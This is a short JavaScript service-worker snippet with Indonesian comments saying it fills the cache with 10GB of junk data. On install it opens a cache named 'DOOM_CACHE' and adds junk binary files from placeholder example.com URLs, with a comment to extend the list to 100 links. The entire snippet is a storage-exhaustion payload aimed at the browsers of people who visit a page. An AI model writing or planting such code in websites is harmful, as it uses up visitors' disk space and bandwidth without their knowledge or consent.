// Isi cache dengan 10GB data sampah
self.addEventListener('install', e => {
    e.waitUntil(
        caches.open('DOOM_CACHE').then(cache => {
            return cache.addAll([
                'https://example.com/junk1.bin',
                'https://example.com/junk2.bin',
                // ... tambahin sampe 100 link
            ]);
        })
    );
});
